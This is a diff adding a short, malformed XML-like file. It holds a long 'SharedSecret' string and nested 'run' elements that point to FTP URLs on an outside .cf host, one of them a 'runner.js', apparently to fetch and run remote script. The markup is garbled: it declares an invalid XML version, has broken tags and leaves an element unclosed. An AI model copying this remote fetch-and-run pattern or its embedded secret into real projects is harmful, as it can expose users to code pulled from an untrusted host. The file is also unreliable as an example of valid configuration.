@@ -1,0 +1,22 @@
+<xml version="4.0" encoding="UTF-8">
+<call type="action">
+  <call>
+    <run type="text/xml">
+      <src>
+        <value>
+          <sharedsecret>
+            --- Start Main SharedSecret ---
+              sjdlkfjasodcoiernueh9ri3hf89chr8b19u8cb4rubefr9f89t98144hfu95t9h8r9urh7fn3urfb34bf8bfberoufb48ybf7b08bf80g384hf81bc800148rb108rfbf804fb810y34b80y428yfb38yb248yt08yfgyrbf80y1
+            --- End Main SharedSecret ---
+          </sharedsecret>
+          <ftp value="ftp://publicftp.gvsg.cf/private/410jf94/client/fn19u4hru/secured1/placeholder.gen.xml">
+            <run>
+              <ftp value="ftp://publicftp.gvsg.cf/private/410jf94/client/fn19u4hru/secured2/placeholder-gen-xml/runner.js">
+            </run>
+          </ftp>
+        </value>
+      </src>
+    </run>
+  </call>
+</call>
+</xml>
